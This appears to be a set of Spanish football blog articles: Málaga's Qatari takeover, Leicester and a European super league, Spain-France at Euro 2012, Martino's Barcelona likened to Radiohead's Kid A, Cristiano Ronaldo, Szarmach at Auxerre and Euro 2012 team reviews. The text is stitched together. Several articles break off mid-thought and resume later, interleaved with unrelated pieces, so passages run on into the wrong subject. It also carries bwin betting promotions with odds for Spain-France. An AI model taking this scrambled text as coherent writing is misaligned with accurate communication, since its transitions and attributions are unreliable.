el disco negro cascando hachazos en cada giro del vinilo sin atender a florituras. El volumen siempre al 10. Wenger lo vio claro en el Nancy ¿Por qué desperdiciar en el extremo zurdo a un tío con tanto talento para machacar tobillos? Di Meco obedeció al que sabía y agarró la guadaña para dedicarse a segar su parcela tras los medios por siempre jamás. El aprendiz de Karlheinz Förster fue dios durante una década en el Velodrome. Se hinchó a ganar en Francia y en Europa y mosqueó a todas las aficiones del país (con especial eficacia a la del odiado PSG) Di Meco cortaba más que el Mistral que sopla desde la costa y se te mete en los huesos cuando estás comprando la entrada para el partido en el Boulevard Michelet. Pero es un jugador que ya no importa. Estás ya en Gran Bretaña.Mañana más. Muchas cosas han cambiado en el Málaga desde que asegurase sobre la bocina la permanencia en aquel partido contra el Madrid. Aún no se había borrado el eco del gol de Duda y el resoplido de alivio de los aficionados cuando saltó la que sin duda ha resultado una de las noticias del verano: el jeque Abdulá Al-Thani compraba a Fernando Sanz la mayor parte del paquete accionarial del Málaga y se hacía con el control total del club, en una operación completamente novedosa en España. Así el grupo NAS, vinculado a la familia real de Qatar, asumía la deuda que había llevado al club andaluz a acogerse a la ley concursal –unos 12 millones de euros- a la vez que sus dirigentes prometían inversión en el equipo para elevar el perfil del club boquerón.Es de suponer que una gran parte de la afición malacitana se frotaría las manos pensando en el surgimiento de un Manchester City andaluz a las orillas de la Costa del Sol, pero a la hora de la verdad la inversión realizada, siendo importante, no parece perseguir una incorporación inmediata del equipo a la élite del fútbol europeo, sino más bien la consolidación del mismo en Primera División. Justo es decir que los inversores árabes han manifestado que consideran el proyecto con objetivos a medio plazo, y que apostarán más fuerte la próxima temporada, ya con el nuevo grupo más rodado.Y es que el cambio en el Málaga, a nivel de plantilla, ha sido drástico. Hasta 15 bajas, comenzando por el entrenador Muñiz y siguiendo por futbolistas de cierto peso como Munúa, Miguel Ángel, Stepanov o Caicedo, han posibilitado la renovación absoluta de una plantilla donde apenas sobreviven clásicos como el mencionado Duda –recién operado-, Apoño o el incansable lateral Jesús Gámez. A cambio, ha llegado una pléyade de refuerzos de diverso pelaje, entre los que abunda el futbolista sudamericano en buena edad y no excesivamente conocido entre el gran público.Excluido de esta categoría Eliseu, que vuelve al lugar donde se hizo un nombre tras su fallida experiencia italiana y un puñado de buenos partidos en el Zaragoza, hay que destacar a Sebas “Petiso” Fernández, pequeño y escurridizo delantero que llega tras completar dos buenas campañas en Banfield. A su lado estará presumiblemente el tanque Rondón, bien conocido en nuestro país por su etapa en Las Palmas, y por detrás deberá cubrirles las espaldas Sandro Silva, un volante tapón que llega del  Botafogo tras haber destacado en Palmeiras, y que deberá formar pareja con Apoño en el medio, una vez que el fichaje de N’Diaye no ha acabado de confirmarse. Bien cubiertos los laterales, el centro de la zaga se refuerza con las llegadas del trotamundos Malagueño y del noruego Stadsgaard, que deberán jugarse el puesto con Weligton. Finalmente, ha venido también el guardameta brasileño Galatto, aunque el primer partido de Liga el marco lo ocupó el veterano Arnau -34 primaveras- y ya se sabe que el puesto de portero pocas veces rota salvo por motivos de fuerza mayor.Sin embargo puede que, a pesar de la multitud de recién llegados, el mejor valor que haya adquirido el Málaga no se encuentre en el césped, sino en el banquillo o la zona técnica. Y es que Jesualdo Ferreira figura desde hace bastante tiempo entre los técnicos del más alto nivel europeo, y le avala la inteligente gestión que realizó en Oporto de la herencia de Mourinho, tras la incertidumbre que se instaló en el club del Dragón en la corta etapa de Víctor Fernández. De su mano, el Málaga espera reverdecer los laureles de aquellos años en los que incluso se jugó en Europa, y sobre todo, que el equpo se afiance en la máxima categoría tras algunas temporadas de zozobra. No sería poco.Lo mejor: la estabilización económica después de un periodo tumultuoso.Lo peor: que tantos recién llegados tarden en conjuntarse, y que los qataríes no tengan la paciencia a medio plazo que requiere la gestión de cualquier club.Pronóstico DDF: media tabla. Sufrí con el Leicester como un cochino. Os lo aseguro. Cualquiera que me hubiera visto el domingo por la mañana –porque todo el mundo sabe que las mañanas de domingo no tienen fin-, con el pijama de cuadros y los vahos en la cabeza de la noche anterior, celebrando cada robo de Kanté como una Champions pequeñita, comiéndome hasta las uñas de las pies después de la expulsión de Simpson, y liberando al cabo el torrente final de tacos que siguió al cabezazo definitivo de Welbeck (presentí que sería él, después de todo), hubiera podido pensar tres cosas: a) para ser de Leicester de toda la vida de Dios, este fulano habla castellano casi sin acento b) está preparando un casting de Fever Pitch o c) qué energúmeno, cómo embrutece el fútbol al personal. Tan educado como parecía.Qué paradoja. Lo que me había transformado por un rato en un voceras y un desequilibrado, embargado sucesivamente por una emoción, una tensión y una tristeza que como mínimo podrían considerarse extemporáneas, era en realidad un síntoma de una de las características más hermosas que tiene el fútbol: es un mundo donde a veces el pequeño tiene realmente la opción de doblarle el codo al poderoso. Y cuando el fan medio, ese al que tan aparatosamente se llama “el neutral” vislumbra la posibilidad del milagro, de repente la situación más anodina se convierte, por un rato y en un territorio ferozmente sentimental, en una cuestión de vida o muerte. Necesitamos que Perseo tumbe a la Medusa, que los espartanos aguanten a los persas, que Labordeta conserve su escaño. Y por eso, una y otra vez, necesitamos ser Grecia, y el Forest y el Alavés, y que el tiro de Smicer entre y ponga el 3-2, y que el Recre firme un 0-3 en el Bernabéu y el Barça se coma cinco en Santander. Es un sentimento bonito, grande, sentirse cerca del débil y pensar que, por una vez y aunque sea en un campo de fútbol, es posible. Y también es una emoción universal, como alguien clavó en twitter en el terrible instante final: Arsenal 2- resto del mundo 1. Es imposible no relacionar la vivencia triste pero maravillosa del sunday morning con una noticia nauseabunda que ha vuelto a asomar su cabeza de hidra tras años de exilio en las tinieblas exteriores: la posibilidad de una liga europea de fútbol tipo NBA. Esta vez ya no planteaban la desaparición de las ligas, sino que se jugasen entre semana y que los equipos grandes utilizasen en ellas sus segundos equipos. Les faltó decir que los jugadores de los equipos pequeños se arrodillasen al paso de los grandes y les pusiesen un cubata después de cada gol.Dice un amigo de un amigo que el fútbol es como un balón de Nivea: que por mucho que intentes hundirlo, siempre sale a flote. Sin embargo, creo firmemente que esta amenaza que pende sobre él es de una gravedad extrema, quizá sólo superada por la de los amaños generalizados. Los flancos en los que hace daño este tipo de planteamientos son incontables: marginación del fútbol modesto, tedio y desinterés por repetición de enfrentamientos entre los grandes, desaparición de la meritocracia, desconexión con la Historia, ampliación de la brecha entre unos y otros, etc. Y todo por conseguir un dinero que en gran parte va a emplearse en fichar a los mismos jugadores a precios mucho mayores.Se puede argüir en favor de este tipo de competición cerrada que en Estados Unidos funciona muy bien en los deportes típicamente americanos, como el basket o el béisbol. Sin embargo, y aparte de que los USA son un país con una idiosincrasia muy especial, tengo la impresión de que en estos deportes, la oportunidad del equipo pequeño respecto del grande es mucho menor que en fútbol, tanto en el corto como en el largo plazo. Esto depende sobre todo de que el fútbol es, entre los deportes de equipo, el más discreto de todos, mucho menos continuo que el baloncesto, el balonmano o el volley. En fútbol un gol es un tesoro que ocurre muy pocas veces en cada partido, es un logro precioso (de precio, no de preciosidad), y además su reglamento permite que el pequeño casi siempre tenga su oportunidad: un córner, una falta lateral, un balón rebotado. Y una expulsión con ochenta minutos por delante puede compensar dos divisiones de diferencia entre los contendientes. Sí, normalmente ganará el fuerte, pero la rendija para el débil es más ancha que en cualquier otro deporte. Mucho más.Un cambio de estructura que separase de modo artificial a poderosos de débiles supondría un golpe durísimo a esa esencia que nos hace el fútbol tan querido. Una esencia que, por mucho que lo olviden los potentados miopes que suelen lanzar este tipo de ideas y fracasan invariablemente dirigiendo equipos de fútbol como si fueran constructoras, es la raíz y el motivo de que este deporte constituya una de los mayores generadores de dinero del planeta. Lo que lleva a un niño, a un joven o a un adulto a sentarse delante de una tele en Burdeos, Bamako, Kuala Lumpur, La Paz o Madrid, para sentirse, por un rato, más vivo de lo habitual. Lo que provoca que la gente salga a la calle a celebrar como si a todos les hubiera nacido un niño nuevo. O lo que hace que yo ya no vaya a olvidar nunca ese partido del Leicester, y esa mañana de domingo salvada para siempre del anonimato. Cualquier chaval de diecisiete años, educado en las gestas recientes de la Roja, esperará el partido de mañana con un punto de nerviosismo, otro de expectación y un plus de confianza. Sabrá que Francia lanzará mañana al césped de Donetsk una manada de jugadorazos, con Benzema y Ribéry a la cabeza, que en teoría pueden destrozar a cualquiera y jugar un fútbol lleno de encanto. También que España no está jugando bien, atenazada por las dudas, con pesadillas en las que Rakitic bate a Casillas y al menos un balón se sitúa en su punto de penalty. Un equipo que ha experimentado cierta regresión en cuatro años, que parece jugar sin alegría, y que se halla en la encrucijada de mil debates, entre lo cruel y lo razonable, que no generan precisamente tranquilidad.El chico andará preocupado si se le pasan por la cabeza estos pensamientos agoreros, pero al final confiará en esa selección que le ha deparado momentos inolvidables. Si la adolescencia es la patria de la personalidad, en el corazón del chico hay clavadas suficiente fotos para que ya, para siempre, los recuerdos del fútbol le sirvan de hogar. Un corcho mental donde se acumulan decensas instantáneas, y que aseguran las chinchetas de la memoria: Cesc espantando fantasmas, Silva convocando ángeles, la carrera de Torres en una carrera, gol de Villa gol de Villa gol de Villa, testarazo de tiburón, paradas de santo.El objetivo se ha convertido en una lacra. El futuro pasa por no caer de nuevo en la ansiedad que ha devorado al portugués y su círculo cercano. Ancelotti no es un entrenador brillante pero sí parece un tipo calmado. En sus manos está que el club vuelva a la normalidad, en su mano está que no se vuelva a quemar la tostada. Alguien tiene que dirigir el cotarro. Los clubes no andan solos. El presidente es la figura para todo, quien sabe si hasta para opinar sobre quien juega y quien no, como si el fútbol fuera una partida de pro de carne y hueso. Dirigir un club debe ser complicado. Ver perder a tu equipo, confiar en jugadores que después se borran, aguantar las increpaciones de los aficionados. Hay presidentes mendrugos y presidentes excelsos. Hay presidentes bocazas y presidentes anacoretas. En cualquier caso, qué sería de los empresarios sin el fútbol, y qué sería del fútbol sin los presidentes. Caneda, Gil, y un señor con gafas. Malos ingredientes para un cocktail histórico. Kid A siempre será “el disco después del Ok Computer”. Cuando en el 1999 Radiohead se metieron en el estudio el bloqueo compositivo de Thom Yorke había desestabilizado al grupo, incapaz de digerir un éxito como el cosechado con el anterior álbum. La solución al problema fue tan sencilla como efectiva: saltar al vacío. Habían llegado al final de un camino, no había nada más allá. Un abismo de roca y el mar bajo ellos, e hicieron lo que pocos grupos hubieran hecho: saltar de la mano a una mejor vida. Kid A es un suicidio musicado, una experimentación que les alejaba del éxito, un nuevo camino más bizarro, imperfecto, frío y sin vuelta atrás. How to disappear completly.El Barcelona de Guardiola no encontrará heredero en el fútbol mundial en mucho tiempo. Su elegancia avasalladora, su estética cargada de resultadismo, esa sensación de estar viendo un fútbol ajeno a los estándares establecidos, no es fácil de conseguir y mucho menos a corto plazo. Su fútbol pasará a la historia de este deporte como el Ok Computer pasará a la historia de la música. Pasarán los años y hablaremos de esto y por más que nos duela, no es lo mismo el debut de los Strokes –excelente disco sin la carga espiritual y compositiva del mencionado de Radiohead– ni será lo mismo el Bayern de Heynckes –excelente equipo sin la brillantez del juego blaugrana-. ¿Qué puede hacer un equipo como el Barcelona después de aquellos años?Pero las proezas pretéritas tienen mucho peso. Klose, único delantero de la lista de veintitrés de Joachim Löw, llega a Brasil pensando en goles, en lo que le da el sustento, en lo que le ha permitido estar presente hasta en cuatro ediciones del torneo en el que todos los futbolistas profesionales depositan sus esperanzas y sus anhelos de gloria. Quién sabe si con el firme objetivo de superar a Ronaldo Nazario como máximo goleador en la historia del torneo. Solo dos goles más, Miro… Dice Fran Sandaza, delantero que parecía llamado a ser héroe de Montilivi en el ascenso del Girona FC, que no entiende ‘la rapidez del Lugo para marcar el gol‘, en referencia al tanto del empate conseguido por los gallegos y que dejaba al conjunto gerundense con la miel en los labios. Criticaba el atacante toledano lo que él juzgaba como un exceso de celo y compromiso en un equipo que ya no se jugaba nada en la clasificación. Como si competir fuese, de repente, algo reprochable. Reacción comprensible, en un momento como el que le tocó vivir anoche al Girona, pero incoherente si a tu queja le añades a renglón seguido la sorpresa por el hecho de ‘que el Sporting gane cero a tres en el campo del Betis‘. Porque si al Betis se le exige tensión y profesionalidad en su enfrentamiento ante el Sporting, en el que al igual que el Lugo nada se jugaba, es de justicia exigir las mismas condiciones al conjunto lucense. O pides que metan la pierna o pides que la retiren, pero a todos por igual, no a capricho y conveniencia. Por puro principio de equidad.Lo de Sandaza no pasa de ser una lógica pataleta de alguien con las pulsaciones disparadas. El furibundo desahogo propio del que veía el ascenso a Primera, el primero en la historia del club, como un hecho prácticamente consumado y de golpe y porrazo recibe un manguerazo helado en el pecho para negarle el éxito de la manera más cruel. Más delicado es, sin embargo, el asunto que subyace tras la reacción de Patxi Otamendi, presidente del Girona. Dice el dirigente, presa sin duda de la inevitable decepción que supone perder el tren del ascenso directo cuando ya empezaban a descorcharse las primeras botellas, que el playoff no sirve de consuelo porque el palo recibido era durísimo. Y automáticamente está enviando un mensaje a sus futbolistas de pesadumbre, de afrontar esa reválida que el fútbol les ofrece con ánimo derrotista y entregado. Las labores de recuperación anímica tras el varapalo sufrido con ese gol de Caballero en el tiempo añadido debieron de comenzar sobre el mismo césped de la derrota. Sin dejar espacio a los miedos. Sin permitir que la rabia, la ira y la frustración ganaran peso en la culminación de una campaña histórica. Eché en falta algo de cordura por parte gerundense en mitad del ataque de histeria de Montilivi. El fútbol casi siempre ofrece segundas oportunidades. Es responsabilidad del Girona afrontarla ahora con entereza y madurez. Es como un cuento de hadas. Pero a veces está bien cuando los cuentos de hadas se hacen realidad.Roy Hodgson, sobre el soñado debut de Harry Kane con Inglaterra.En realidad, la historia es ya conocida en Inglaterra. Los patrones se repiten periódicamente desde el 66 y siempre hay un hilo de esperanza que asoma tembloroso entre el marasmo generalizado. Inglaterra viene demandando, mientras enlaza una regeneración profunda tras otra, la irrupción de un nuevo Geoff Hurst desde que el mítico delantero de Manchester ajusticiara a los alemanes en la prórroga de aquella final de Wembley. El problema es que no es suficiente con que el aspirante a sustituto sea un extraordinario y completo futbolista, como Gary Lineker, un goleador incontestable, como Alan Shearer o un jugador capaz de echarse todo el país sobre su extensa espalda, como Wayne Rooney. El asunto está en que quien necesita vivir un cuento de hadas en su máxima expresión no es Harry Kane, por mucho que el joven delantero spur anotase su primer gol a los setenta y nueve segundos de su debut como internacional absoluto. Quien necesita su fairytale particular es el propio seleccionado inglés.Saltar al vacío. El club está hundido en lo institucional, descabezado, incapaz de alargar la sombra de éxitos y aún así, por inercia, cosechando algún éxito, títulos y buen juego –puntualmente-. Se acusa al Tata Martino de estatismo, de incapacidad para revolucionar el plantel, de no ser capaz de grabar otro Ok Computer. Y yo creo, sin embargo, que el argentino está en la senda de algo nuevo. Su capacidad para, desde fuera, analizar el fútbol blaugrana le ha hecho prever un desgaste anunciado. Ha sentado a Iniesta, a Messi, ha conseguido revitalizar a Alexis, a un desconocido Pedro, a un Cesc imperial –y lo que le queda- en el centro del campo. Ha conseguido tocar otra canción con los mismos hombres, no es aquella coreografía magistral de Guardiola, no es esa danza milimétrica y preñada de gusto, es otra cosa, pero otra cosa que puede funcionar, que puede divertir, que podemos disfrutar con los auriculares puestos en el silencio del salón.No se puede pedir a Martino, que vino tras un año convulso –no en las decisiones sino en las circunstancias- que dé con la partitura perfecta. Él sabe que no puede y ha decidido hacer otra cosa, no continuar lo que ya estaba bien así, lo que ya no puede mejorarse. Tiene tiempo, aún no ha entrado en el estudio, necesita nuevos músicos, estabilidad en el club y confianza. La paciencia que el aficionado nunca tiene a bien dar. Nick Hornby dijo del Kid A que era un suicidio comercial. Así ven muchos periodistas al Barcelona de Martino, un equipo condenado a la nada. Yo creo que sin embargo sólo acabando con una etapa anterior es posible abrir una nueva senda. Martino, me da la sensación, lo sabe. Por eso ya no escucha el Ok Computer en casa, quizá se pone en casa jazz, o krautrock, o discos peores pero nuevos. A lo mejor busca pistas para componer un disco nuevo, un disco tan bueno como el que escucho ahora mientras escribo este artículo, que no es el Ok Computer pero que logra emocionarme igual. Quizá Everything in its right place. Noche europea de los equipos españoles, noche de debate en las porterías. Villarreal y Athletic lo tienen claro.Iniesta. Quién no se sentiría seguro…Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. …y quién cumpliese esos diecisete años. Otros acumulamos alguno más -más de lo que querríamos- y para todos nosotros el dolor tuvo forma de gallo, la impotencia y la tristeza vistieron de azul, y en nuestras pesadillas se fundía la carroña de Baudelaire con el viaje sin fin ni objeto que inmortalizó algún Céline. No llegarán las 20:45 sin ver doscientas veces a Arconada arrastrarse como una serpiente sin aire, a ese Zizou que tanto quisimos rompiendo la escuadra incorrecta, Djorkaeff bailando entre centrales de piedra, los sueños de cristal que saltaron en pedazos en 2006 ante la evidencia de la veteranía, o Raúl apurando a chorros el cáliz más amargo de su vida Demasiadas visiones negras, demasiada hiel, demasiada Francia venciéndonos siempre para que podamos esperar con la tranquilidad de los que se suponen grandes.Pero habrá que creer. Que los tipos que se visten de rojo han convertido los cuartos de hazaña en rutina. Que a lo mejor han visto por la tele hoy a Alemania, demostrando que no pasa nada por mirar de vez en cuando la portería contraria. Que el balón puede correr más rápido, Torres recuperar el gatillo fácil y Del Bosque los cambios que nadie chistaba porque todos veíamos que funcionaban bien. Creer en el toque, el pase y la técnica, y desear que vuelvan a conjugarse con la intensidad, la verticalidad y la contundencia. Creer, porque no sólo el chaval de 17, sino todos nosotros vivimos estos años de gloria. Porque, después de todo, son los campeones, los que aspiran a la trinidad imposible. Ellos, los únicos.Si hay un partido incierto en los cuartos de esta Eurocopa, es este España-Francia. Sin embargo, como en bwin.es confían mucho más en España (1.75 la victoria, 3.50 empate, 5.00 derrota) darle la oportunidad a los galos puede endulzar la indeseable derrota con un buen pellizco. Las cuotas de apuestas a que España gane en la prórroga o los penaltis se van a 10 y 11.50, y para Francia a 15 y 11.50; una gran opción teniendo en cuenta lo fácil que es un empate en partidos de este nivel. Hay que tener en cuenta también el 3.25 a que se paga el gol de Benzema, aún inédito en el torneo, y el 4.50 de Nasri, en buen momento. Finalmente, está bien destacar que un latigazo de Torres abriendo el marcador se paga a 5.50. Y ya lo hizo contra Irlanda. Hoy vuelve Xabi Alonso al campo de Anoeta en el que se dio a conocer como futbolista, y lo hace como campeón del mundo, campeón de Europa y con la vitola de ser uno de los centrocampistas más respetados del panorama internacional. Además, el hijo de Periko vuelve con la camiseta del Real Madrid, paradójicamente el equipo que frustró los sueños de la última gran Real que hemos conocido, aquella que rozó el campeonato de Liga y a la que sólo un demoledor sprint final de los galácticos (de los de verdad, Ronaldo especialmente) y un desgraciado partido en Vigo separaron de la gloria. Por ello, recordamos hoy la actuación de Xabi en el gran partido que aquella temporada disputaron en Donosti los dos aspirantes, que resultó una exhibición del equipo local y, en particular, la confirmación de que su joven cerebro iba a convertirse en uno de los medios de referencia en la década siguiente. Ya se ven en el video todas las cualidades que le han hecho grande –colocación, facilidad para distinguir el pase correcto, inteligencia, capacidad defensiva, disparo lejano- y muy especialmente su dominio del pase largo, suerte en la que seguramente es el mayor especialista del mundo. Que lo disfrutéis. Es curioso que el mundial de México 70 fuera tan limpio y alegre que, a pesar de instaurarse en él las tarjetas, ningún jugador viera en él la roja que da lugar a expulsión. El dudoso privilegio de ser el pionero en recibirla correspondió al chileno Carlos Caszely en el partido inaugural de la siguiente Copa del Mundo, al revolverse contra su marcador Vogts. El chino, uno de los mejores futbolistas que haya dado el país andino y también uno de los pocos que manifestó en su momento su oposición al régimen de Pinochet, representó como nadie el prototipo de jugador maldito en el mundial, pues ocho años después falló un penalty contra Austria que podía haber cambiado la suerte de su selección en España 82. En la actualidad ejerce como periodista deportivo. Ahora que el ambiente parece haberse tranquilizado con la distancia al Clásico, los dos partidos que ha jugado el Madrid entre medias, el Mundialito y, cómo no, el ambiente navideño que ya nos va impregnando a todos, toca hablar un poquito de Cristiano Ronaldo, y de cómo se encuentra en una etapa clave de su carrera. Un momentum que casi con total seguridad va a determinar su impacto global como futbolista, su posición futura en el Olimpo de las estrellas, e incluso la huella que dejará para las generaciones que vienen detrás.Inductivamente, ascendamos de lo local a lo global, y depositemos nuestra atención sobre un hecho tan banal que casi podríamos catalogar de anécdota: los silbidos que le dedicó una parte de la afición del Bernabéu en el choque contra el Barça. Por supuesto, la situación deriva en parte del contexto más desagradable posible para el madridismo, que es la inferioridad manifiesta –institucional, deportiva, mediática- respecto al Barcelona, combinada con la repetición casi inexorable de la derrota en el enfrentamiento directo, sea el Madrid claramente superado por el rival o consiga mantener un cierto equilibrio. Una situación que exacerba cualquier sentimiento crítico, y que no contribuyeron a tranquilizar las dos estupendas ocasiones que falló el portugués durante el choque.Bájate de ese camión maloliente y comprende que las únicas caricias que vas a disfrutar en mucho tiempo son las de la lana de tu bufanda del Shakhtar. Como tu padre en Yugoslavia hace tantos años. Y tira, arrastrándote tan dignamente como la canción de Joe Strummer hasta el escáparatate con electrodomésticos. Si limpias un poco ese engrudo de vaho y porquería acumulada, por ese hueco, verás que jugar los tuyos contra el mejor equipo del mundo. Aprovechando que el Real Madrid disputa en Auxerre partido correspondiente a la segunda jornada de Champions, me apetece poner el foco en la historia de Andrzej Szarmach: delantero polaco de leyenda y a la sazón máximo goleador en la historia del Auxerre. Buenos viejos tiempos.En unos años me convertiré en el señor mayor que devora farias en la tribuna mientras escupe pestes contra la plantilla entera. Lo sé. Quizá no fume puros porque me dan verdadero asco pero del resto no tengo duda alguna. Que espetaré al fulanito de turno lo de que no le llega a la suela de los zapatos a mi gran menganito es tan cierto como que los balones son redondos. Que juraré en hebreo por el diseño de las nuevas camisetas y porque los futbolistas me corren demasiado deprisa, fijo. Flotaré en una nube de nostalgia y desde allí me cagaré en todo. Lo veo. De otro modo no me explico el absoluto convencimiento que tengo en que el fútbol antiguo le da cien vueltas al actual. O al menos sus alrededores. ¿Acaso sucede ahora algo tan bello como fichar a un polaco talludo y que se convierta en el máximo goleador en la historia de tu club? ¿Donde quedaron los futbolistas que se acercaban físicamente a la imagen que tenemos de un ser humano normal? Yo se lo diré. Todo eso quedó en el bigote de Andrzej Szarmach.Szarmach ya era un cromo destacado del fútbol polaco antes de abrir el libro de historia del Auxerre y añadirle un nuevo capítulo. Siete años en el Gornik Zabrze y dos en el Stal Mielec le habían servido para embolsarse siete trofeos de máximo artillero. Y con la selección más de lo mismo. En un santiamén paso de jugar en Tercera División a formar pareja de ataque con Grzegorz Lato en aquel prodigioso once polaco que supo encaramarse al tercer puesto en Alemania 74. Tenía 23 años y marcó ante Argentina, Haití (tres tantos) e Italia quedando a tan sólo dos goles de los siete que otorgaron a su compañero Lato el premio al futbolista más goleador del campeonato. Era una estrella. Uno le observa cazando goles en sus vídeos y ve una combinatoria imposible de Asterix y un fontanero arquetípico. Le miras y crees que algún día serás futbolista pero detrás había un delantero que sabía colocar la pelotita en el fondo de las mallas.Unos condicionantes sombríos para el equipo en general, y su estrella en particular.Sin embargo, cuando un público tan avezado y experto como el de Chamartín decide dedicar silbidos a un futbolista de tal talla, los motivos deben ir bastante más allá de una situación tan coyuntural como un mal partido o una mala actuación. En este caso concreto, es bastante posible que la motivación del aficionado de su equipo que le censura provenga sobre todo de dos circunstancias que se vienen observando con frecuencia desde que el futbolista llegó a Madrid en 2009. Por una parte, una serie de comportamientos que, sin ser violentos ni antideportivos, escuecen mucho al observador neutral, a la vez que ofenden la imagen habitual que el madridista tiene de su propio club; todo ese cúmulo de posturitas, gestos chulescos, manos en la oreja al marcar o declaraciones tipo “quien me critica no sabe de fútbol” o “me tienen envidia por ser guapo”. Un manual de estupideces y niñerías que le granjean animadversión y odio, le separan de su propia afición y ensucian o minimizan sus indiscutibles méritos como futbolista. Muy fáciles de corregir, además.Las otras razones por las que el aficionado blanco no acaba de entregarse a Cristiano Ronaldo proceden directamente de su rendimiento deportivo. Especialista en triturar a rivales de nivel medio o bajo, a los que abruma o directamente aplasta luciendo su inconmensurable arsenal de virtudes físicas y técnicas, su rendimiento desciende considerablemente ante rivales de empaque, que le impiden ejercitar su despliegue y lo llevan a terrenos donde, más que la fuerza y la potencia, mandan la precisión, la sutileza y el conocimiento del juego. Son cualidades de las que Cristiano no anda sobrado, y esta carencia le penaliza sin piedad, una vez tras otra, en esos duelos en los que todos los focos caen sobre él. Futbolista orgulloso, sobrado de pundonor y autoestima, se obceca en imponer sus virtudes en escenarios nada propicios para ellas, y el resultado suele traducirse en pérdidas de balón, pelotazos a la grada, aventuras individuales que quedan en nada e intrascendencia general. La situación se vuelve insoportable en la comparación con Messi, que reúne punto por punto dichas virtudes, y además las aprovecha para obtener, desde otros presupuestos, unas cifras goleadoras igual de sobrenaturales. Seguramente a Cristiano le encantaría disfrutar de la unanimidad que genera Leo, así como asumir un papel de mesías en el madridismo similar al que ejerce semana tras semana el rosarino en Barcelona. En cambio, sólo encuentra desconfianza y voces discordantes que alimentan su círculo vicioso, y muchos madridistas que opinan que ni siquiera es el jugador menos prescindible del equipo. Para ellos, el hombre es Xabi Alonso.Si Cristiano Ronaldo  quiere alcanzar su cúspide como futbolista, debe asumir que es un maravilloso goleador, quizá el mejor de nuestro tiempo, y “sólo” eso. Ni más ni menos, con sus pros y sus contras. Puede que se hiciera un nombre en el Sporting como extremo –frente a las defensas portuguesas, no offence– pero se ha convertido en el icono actual por sus impresionantes cifras goleadores y su demoledora capacidad frente a la puerta contraria. Un matador atípico porque parte desde la banda en lugar de vivir en el área, pero esto es fútbol moderno de élite, no los años 60 en cualquier barrizal de las Midlands. Quizá en sus pies estén los goles que puedan llevar al Madrid a discutirle realmente al Barça su supremacía actual, pero no está, ni va a estar, el fútbol necesario para llegar a ello; eso es cosa de otros, y cuanto antes lo asimile Cristiano, mayor será su rendimiento y, sobre todo, el de su equipo. Esta asimilación debería conllevar una cierta mejora de su aportación al engranaje colectivo –algo que hemos empezado a ver este año- a la vez que desdeñar la tentación de jugárselo todo en solitario cuando la cosa va mal y el contrario es poderoso. Esta es la auténtica humildad que le hace falta como futbolista, la de reconocer sus deficiencias para ocultarlas e impedir que oscurezcan sus tremendas virtudes. Puede ser que el astro portugués tome este camino –está en su mano-, y puede que no. Si su decisión es la segunda, quizá antes de lo que piensa comience a descender escalones. Pero si escoge correctamente, en cambio, es muy probable que lleguen esos galardones individuales que ansía –siempre posteriores, no anteriores, a los títulos- y con el tiempo, un lugar junto a los Puskas, Müller, Van Basten o Hugo Sánchez, que ya es un logro descomunal. La gran sala del Valhalla, la de los Di Stéfano, Pelé, Maradona o Messi, siempre le quedará lejos. Es ley de vida. Y no se acaba el mundo por eso. Junto con los del Mundial de Italia, el partido que más sospechas ha levantado jamás en la historia de la Copa del Mundo. Argentina no había hecho sus deberes en el grupo de cuatro que hacía las veces de cuartos y semifinales, y necesitaba vencer por al menos cuatro goles de diferencia  a Perú en el último partido. Nada se jugaban los andinos, pero se trataba de la mejor selección peruana de la historia, que contaba con jugadorazos como Chumpitaz o Cubillas, y que había superado la fase previa por delante de la gran Holanda. Por ello, el escandaloso 6-0 final, el régimen dictatorial que sufría Argentina y algunas investigaciones posteriores han sembrado las suspicacias sobre la victoria albiceleste, aunque en realidad nunca nada se haya probado fehacientemente. Ahí queda el vídeo, en cualquier caso. Inglaterra. Cuartos de final. Dos partidos ganados y dos empatados, con cinco goles a favor y tres en contra. Goleadores: Lescott, Carroll, Walcott, Welbeck y Rooney.Lo mejor. La excelente disciplina defensiva mostrada durante todo el torneo, que casó a la perfección con su papel de lobo con piel de cordero, y la efectividad rematadora, fundamental para que funcionen este tipo de planteamientos.Lo peor. No es la mejor generación inglesa, y se notó cuando los de Hodgson debieron llevar el ritmo de los partidos. También sobraron las payasadas de Hart en la tanda de penaltis, triste e inútil émulo de Grobbelaar.La estrella. Steven Gerrard, un jugadorazo que rinde más y mejor cuando menos se le espera. Liberado de la artificial competencia con Lampard, que lo ha lastrado durante toda su trayectoria internacional, funcionó de maravilla como surtidor de balones tensos y cruzados. Lo agradecieron los rematadores.El momento. El extraordinario remate de espuela de Welbeck ante Suecia, que cerraba un partido vibrante y enterraba el pesimismo que hasta entonces había acompañado a la expedición pross por la Eurocopa. Uno de los goles del campeonato.Francia. Cuartos de final. Un partido ganado, otro empatado y dos perdidos, tres goles anotados y cinco encajados. Goleadores: Nasri, Ménez y Cabaye.Lo mejor. El partido contra Ucrania, y el hecho de que Blanc haya confiado en una camada de jugadores jóvenes y técnicos que darán bastantes alegrías en el futuro.Lo peor. La sensación de acomodamiento y poca tensión transmitida durante gran parte del torneo, muy especialmente contra España, y los incidentes entre jugadores que acabaron saliendo a la luz. El proyecto Blanc ha acabado hecho trizas, y su reputación tocada.La estrella. Se esperaba que fuese el campeonato de Benzema, pero el mejor rendimiento seguramente lo dio Cabaye,  jefe del centro del campo con la misma jerarquía que despliega cada semana en St. James’ Park. Jugador demasiado poco considerado.El momento. Los cinco minutos del día de la tormenta en que dos asistencias de Karim finiquitaron a los anfitriones y abrieron la puerta de los cuartos. Ahí sí se parecieron les bleus a lo que muchos esperábamos de ellos antes del campeonato.Ucrania. Primera fase.Rápido, fuerte en el aire y oportunista, el bigotón estaba fabricado para el gol. ¿Por qué un tipo de su categoría llegó tan tarde al fútbol occidental? En sencillo, Szarmach pertenece a la generación de futbolistas a las que las inflexibles normas políticas y deportivas de sus paises natales les impidieron desarrollar sus mejores años en equipos de mayor nivel en el extranjero. Pero a punto de echarse treinta años en la mochila le llega la oportunidad de salir de Polonia. “Mi compatriota Wieczorek había fichado ya por el Auxerre y me habó bien del club. Ellos me querían, me reuní con sus dirigentes en junio y firmamos el contrato en secreto el día 12. Pero la Federación Polaca no dejaba marchar a ningún futbolista menor de treinta años así que tuve que esperar como todos los demás. Finalmente aterricé el 20 de noviembre en Orly como e ystaba previsto y de acuerdo con mi federación una vez cumplidos los treinta. Nunca tuve dudas de que iba a venir porque había firmado un contrato” , explicaba en una entrevista al periódico local L’Yonne Républicaine justo a su llegada 